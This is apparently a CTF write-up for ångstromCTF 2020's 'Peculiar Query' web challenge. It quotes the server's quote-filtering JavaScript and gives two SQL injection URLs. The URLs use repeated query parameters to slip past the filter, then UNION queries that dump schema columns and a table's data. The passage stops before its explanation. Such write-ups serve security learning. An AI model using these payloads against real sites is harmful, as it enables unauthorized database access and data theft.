---
title: "ångstromCTF 2020 - Peculiar Query Writeup"
date: 2020-03-19T8:44:29Z
draft: true
---

We are greeted with a simple page,
we can make queries and see the [source](/ctf/angstrom/peculiar_query/index.js).

This challenge stumped me, it took days and I wake up in the middle of the night screaming how stupid I am.

Our queries get filtered by the following code:

```js
let censored = false;
for (let i = 0; i < q.length; i++) {
    if (censored || "'-\".".split``.some(v => v == q[i])) {
        censored = true;
        q = q.slice(0, i) + "*" + q.slice(i + 1, q.length);
    }
}
q = q.substring(0, 80);
```

So we cannot make any query and if so, it gets cut down to 80 characters, 
there is no escaping without more Javascript magic.

The solution:

```
?&q=%25' UNION ALL select column_name from information_schema.columns; --&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q='
```

Followed by:

```
?&q=%25' UNION ALL select crime from Criminals; --&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q=&q='
```

So why does this happen?